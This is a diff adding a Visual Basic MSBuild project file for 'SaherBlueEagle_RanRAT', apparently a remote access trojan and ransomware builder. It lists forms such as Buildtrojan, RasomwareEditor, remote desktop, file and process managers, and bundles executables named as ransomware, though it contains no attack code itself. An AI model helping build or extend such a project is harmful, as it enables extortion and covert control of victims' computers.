@@ -1,0 +1,340 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>
+    </ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{E1334D34-3B5A-4FE3-BCA7-F27665256E87}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <StartupObject>SaherBlueEagle_RanRAT.My.MyApplication</StartupObject>
+    <RootNamespace>SaherBlueEagle_RanRAT</RootNamespace>
+    <AssemblyName>SaherBlueEagle_RanRAT</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>WindowsForms</MyType>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <TargetFrameworkProfile>
+    </TargetFrameworkProfile>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DocumentationFile>SaherBlueEagle_RanRAT.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>SaherBlueEagle_RanRAT.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>Off</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>imageedit_1_5226222682.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="Microsoft.VisualBasic" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Data" />
+    <Import Include="System.Drawing" />
+    <Import Include="System.Diagnostics" />
+    <Import Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Buildtrojan.Designer.vb">
+      <DependentUpon>Buildtrojan.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Buildtrojan.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Chat.Designer.vb">
+      <DependentUpon>Chat.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Chat.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Command_Prompt.Designer.vb">
+      <DependentUpon>Command_Prompt.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Command_Prompt.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="countrylist.Designer.vb">
+      <DependentUpon>countrylist.vb</DependentUpon>
+    </Compile>
+    <Compile Include="countrylist.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Desktop.Designer.vb">
+      <DependentUpon>Desktop.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Desktop.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Filemanager.Designer.vb">
+      <DependentUpon>Filemanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Filemanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="fiprop.Designer.vb">
+      <DependentUpon>fiprop.vb</DependentUpon>
+    </Compile>
+    <Compile Include="fiprop.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.vb">
+      <DependentUpon>Form1.vb</DependentUpon>
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="GuiDesigner.Designer.vb">
+      <DependentUpon>GuiDesigner.vb</DependentUpon>
+    </Compile>
+    <Compile Include="GuiDesigner.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="icochanger.Designer.vb">
+      <DependentUpon>icochanger.vb</DependentUpon>
+    </Compile>
+    <Compile Include="icochanger.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Login.Designer.vb">
+      <DependentUpon>Login.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Login.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MapGadget.Designer.vb">
+      <DependentUpon>MapGadget.vb</DependentUpon>
+    </Compile>
+    <Compile Include="MapGadget.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My Project\Application.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Application.myapp</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Notify.Designer.vb">
+      <DependentUpon>Notify.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Notify.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ProcessManager.Designer.vb">
+      <DependentUpon>ProcessManager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="ProcessManager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="RasomwareEditor.Designer.vb">
+      <DependentUpon>RasomwareEditor.vb</DependentUpon>
+    </Compile>
+    <Compile Include="RasomwareEditor.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Text_Editor.Designer.vb">
+      <DependentUpon>Text_Editor.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Text_Editor.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="TransparentListView.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="User.vb" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Buildtrojan.resx">
+      <DependentUpon>Buildtrojan.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Chat.resx">
+      <DependentUpon>Chat.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Command_Prompt.resx">
+      <DependentUpon>Command_Prompt.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="countrylist.resx">
+      <DependentUpon>countrylist.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Desktop.resx">
+      <DependentUpon>Desktop.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Filemanager.resx">
+      <DependentUpon>Filemanager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="fiprop.resx">
+      <DependentUpon>fiprop.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="GuiDesigner.resx">
+      <DependentUpon>GuiDesigner.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="icochanger.resx">
+      <DependentUpon>icochanger.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Login.resx">
+      <DependentUpon>Login.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="MapGadget.resx">
+      <DependentUpon>MapGadget.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Notify.resx">
+      <DependentUpon>Notify.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ProcessManager.resx">
+      <DependentUpon>ProcessManager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="RasomwareEditor.resx">
+      <DependentUpon>RasomwareEditor.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Text_Editor.resx">
+      <DependentUpon>Text_Editor.vb</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="My Project\Application.myapp">
+      <Generator>MyApplicationCodeGenerator</Generator>
+      <LastGenOutput>Application.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="My Project\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\project.nrproj" />
+    <None Include="Resources\svchdec.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\themexdesign.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\themexdesign.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\redxform.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\redxform.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bluexform.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bluexform.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\dangernogui.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Saher Blue Eagle Ransomware.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\nRansomwarex.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\nRansomwarexEditor.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\background.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\countryinfo.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Icons-Land-Vista-Hardware-Devices-Home-Server.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_273.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_18.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_19.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\shell32_179.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\TEApplet.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ايقونة.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\crazy hacker.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\svchdec.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\reac.exe" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="imageedit_1_5226222682.ico" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
